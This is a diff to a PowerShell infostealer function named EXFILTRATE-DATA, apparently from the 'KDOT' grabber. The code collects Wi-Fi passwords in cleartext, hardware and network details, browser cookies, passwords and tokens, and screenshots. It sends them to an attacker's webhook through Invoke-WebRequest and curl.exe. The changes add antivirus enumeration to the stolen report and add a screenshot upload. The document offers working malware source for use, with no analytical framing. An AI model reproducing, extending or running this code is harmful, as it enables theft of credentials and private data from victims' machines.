@@ -22,11 +22,21 @@ function EXFILTRATE-DATA {
     $format = " GB"
     $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
     $raminfo = "$total" + "$format"  
-    $mac = Get-WmiObject win32_networkadapterconfiguration | select description, macaddress
+    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
     $mac > $env:LOCALAPPDATA\Temp\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
+	
+	
+	# List of Installed AVs
+	
+	function get-installed-av {
+    $wmiQuery = "SELECT * FROM AntiVirusProduct"
+    $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
+    $AntivirusProduct.displayName 
+    }
+    $avlist = get-installed-av -autosize | ft | out-string
     
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
@@ -56,7 +66,7 @@ function EXFILTRATE-DATA {
     $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
     $graphics = [Drawing.Graphics]::FromImage($bmp)
     $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
+    $bmp.Save("$env:localappdata\temp\screenshot.png")
     $graphics.Dispose()
     $bmp.Dispose()
     
@@ -90,6 +100,10 @@ function EXFILTRATE-DATA {
                         "name" = ":bust_in_silhouette: User Information"
                         "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                     },
+					@{
+                        "name" = ":shield: Antivirus"
+                        "value" = "``````$avlist``````"
+                    },
                     @{
                         "name" = ":computer: Hardware"
                         "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````"
@@ -109,6 +123,9 @@ function EXFILTRATE-DATA {
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
+	
+	# Screenshot Embed
+	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\screenshot.png\`"" $webhook | out-null
 
     Set-Location $env:LOCALAPPDATA\Temp
 
@@ -141,7 +158,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
+    Move-Item -Path "$extracted\screenshot.png" -Destination "$extracted\KDOT\screenshot.png" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue
